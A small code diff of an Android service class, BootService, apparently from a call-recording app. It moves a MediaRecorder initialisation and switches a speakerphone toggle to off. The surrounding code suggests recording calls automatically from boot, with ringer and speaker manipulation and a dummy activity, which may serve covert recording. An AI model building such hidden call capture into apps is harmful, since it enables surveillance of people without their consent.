@@ -56,13 +56,8 @@ public class BootService extends Service
 	private TelephonyManager telManager;
 	private boolean recordStarted = false;
 	public static String otherSidePhoneNum = "";
-	private static MediaRecorder recorder;
-	
+	private static MediaRecorder recorder = new MediaRecorder();
 	private static IntentFilter screenStateIntent = null;
-	
-	static {
-		recorder = new MediaRecorder();
-	}
 	
 	private final PhoneStateListener phoneListener = new PhoneStateListener() {
 		private static final long MIN_FILE_SIZE = 10240; // 10KB
@@ -157,8 +152,8 @@ public class BootService extends Service
     					AudioManager audioManager = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
     					audioManager.setRingerMode(GlobalValues.ORIGINAL_RING_MODE);
     					
-    					// Restore speaker
-    					audioManager.setSpeakerphoneOn(true);
+    					// Mute speaker
+    					audioManager.setSpeakerphoneOn(false);
     					
     					// Broadcast intent to let DummyActivity to exit
     					Intent exitIntent = new Intent(DummyActivity.BROADCAST_ACTION_DUMMY_ACTIVITY_EXIT);
